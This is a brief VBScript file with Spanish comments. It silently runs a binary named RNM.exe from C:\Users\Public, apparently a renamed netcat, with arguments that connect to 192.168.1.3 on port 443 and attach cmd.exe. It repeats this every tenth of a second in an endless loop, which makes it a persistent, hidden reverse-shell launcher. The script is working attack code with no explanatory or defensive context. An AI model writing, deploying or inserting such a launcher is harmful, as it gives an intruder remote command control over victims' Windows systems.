Set objShell = CreateObject("WScript.Shell")
carpeta_archivos = "C:\Users\Public"
input_archivo = """" & carpeta_archivos & "\RNM.exe"""
puerto = "443"

' Bucle infinito
Do
    comando = "-nv 192.168.1.3 " & puerto & " -e cmd.exe"
    retorno = objShell.Run(input_archivo & " " & comando, 0, False)
    WScript.Sleep 100 ' Espera 0.1 segundos antes de volver a intentar
Loop
